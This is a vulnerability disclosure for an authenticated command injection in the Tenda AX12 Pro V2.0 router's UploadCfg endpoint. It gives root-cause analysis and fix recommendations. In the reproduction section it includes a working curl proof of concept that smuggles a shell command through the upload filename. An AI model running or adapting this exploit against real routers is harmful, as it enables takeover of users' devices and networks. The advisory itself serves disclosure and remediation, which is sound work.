## Tenda AX12 Pro V2.0 UploadCfg Authenticated Command Injection Vulnerability
### Basic Information
1. Vendor: Shenzhen Jixiang Tenda Technology Co., Ltd. (Tenda)
2. Affected Device: AX12 Pro V2.0 Wi-Fi 6 Dual-band Gigabit Wireless Router
3. Vulnerable Firmware Version: v16.03.49.24
4. Vulnerability Discovery Date: June 18, 2026
5. Vulnerability Category: Authenticated OS Command Injection (Binary Vulnerability)
6. Vulnerable Interface: `/cgi-bin/UploadCfg`

### 1. Vulnerability Overview
Tenda AX12 Pro V2.0 is a consumer-oriented Wi-Fi 6 gigabit router. Its background configuration upload interface `/cgi-bin/UploadCfg` suffers from an authenticated command injection vulnerability.

Attackers with valid web management login credentials (valid Cookie and stok token) can craft malicious `filename` parameters in multipart/form-data upload requests. By injecting single quotes and shell command substitution operators into the filename field, attackers can break the original shell command syntax and execute arbitrary system commands via the backend `system()` function. Successful exploitation allows full remote control of the router operating system.

### 2. Vulnerability Technical Analysis
#### 2.1 Function Call Chain of Vulnerable CGI
```plain
/cgi-bin/UploadCfg
    -> webs_Tenda_CGI_BIN_Handler()
        -> webCgiDoUpload()
            -> UploadCfg() (in libgo.so)
                -> system()
```

#### 2.2 Root Cause
The `UploadCfg` function inside `libgo.so` parses the user-controlled `filename` value from the multipart upload request and stores it in the upload information structure.  
The websNormalizeUriPath() function only sanitizes path traversal characters like / and .., with no filtering applied to shell meta-characters such as single quotes, dollar signs, parentheses, semicolons, backticks, ampersands, and vertical bars.

The vulnerable code snippet uses `snprintf` to splice the unsanitized client filename directly into a shell command string, then passes the constructed string to the dangerous `system()` function for execution:

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54275507/1782129394065-42aa8567-7034-4e89-9e83-7bb6b7d8607c.png)

The `%s` placeholder is wrapped with single quotes. Attackers can supply a payload like `x'$(touch pwned)'` to close the original single quote, inject custom shell commands, and break out of the original command context.

#### 2.3 Data Storage Logic of Upload Parameters
```c
// Store parsed upload fields into uploadInfo structure
uploadInfo[0] = sclone(tempPath);      // Temporary file path
uploadInfo[1] = sclone(filename);     // Controllable client filename (+8 offset)
uploadInfo[2] = sclone(contentType);
uploadInfo[3] = size;
```

The client-controlled filename is stored at offset +8 of the uploadInfo structure and directly referenced in the shell command splicing logic.

### 3. Vulnerability Reproduction Steps
#### Step 1: Log into the router web backend to obtain authentication credentials
Send a login request to the router management page. A successful response returns two critical authentication materials:

1. Session Cookie (`_:USERNAME:_`)
2. Access token `stok`

Sample successful login response:

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54275507/1782129410999-9f76baf6-2364-4811-9dcc-a56c9ec26abf.png)

#### Step 2: Prepare a dummy upload file
```bash
printf 'Default\n' > /tmp/cfg.txt
```

#### Step 3: Exploit PoC (Creates file /tmp/pwned on target router)
Replace `VALID_COOKIE` and `VALID_STOK` with real values obtained from login:

```bash
curl 10.93.252.97 -i -m 15 \
-H 'Cookie: _:USERNAME:_=VALID_COOKIE' \
-F "file=@/tmp/cfg.txt;filename=x'\$(touch pwned)'" \
'http://10.93.252.97/cgi-bin/UploadCfg?stok=VALID_STOK'
```

#### Step 4: Verification of Exploitation
After executing the PoC, log into the router shell and check the `/tmp` directory. A file named `pwned` will be generated, proving arbitrary command execution is achievable.

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54275507/1782129424404-6e51ab96-3cae-4f88-ab3a-3a3fe98d47e0.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54275507/1782129429216-8ee81ada-bbef-4d28-b5ca-a24b65de8490.png)

### 4. Vulnerability Impact
1. After obtaining valid web backend login permissions, remote attackers can execute arbitrary Linux system commands on the router;
2. Full control over device configuration, firmware, user credentials, network traffic, and storage files;
3. Attackers may install backdoors, modify routing rules, steal Wi-Fi passwords, or launch lateral attacks against internal LAN devices.

### 5. Official Firmware Information
+ Firmware Name: USAX12ProV2.0mt_V16.03.49.24cn_TDC01.bin
+ Firmware Version: v16.03.49.24
+ Release Date: 2026-03-02
+ File Size: 13.90M
+ Applicable Hardware: Tenda AX12 Pro V2.0 hardware version V2.0

### 6. Fix & Mitigation Recommendations
1. Eliminate dangerous `system()` calls that splice untrusted user input into shell command strings. Avoid invoking shell interpreters entirely.
2. Replace shell file operations with native secure system APIs, e.g. use `rename()` to move temporary files instead of the `mv` shell command.
3. Strictly sanitize and block all shell meta-characters from the client-supplied `filename` field, including:  
`' " ; & | ` $ ( ) < > \n \r`
4. Implement a whitelist filter for upload filenames: only allow alphanumeric characters, underscores and dots; reject all other special symbols.
5. Add length restrictions on client filenames to prevent overlong payload injection.

### 7. Disclosure Timeline Reference
  Vulnerability discovered: June 18, 2026

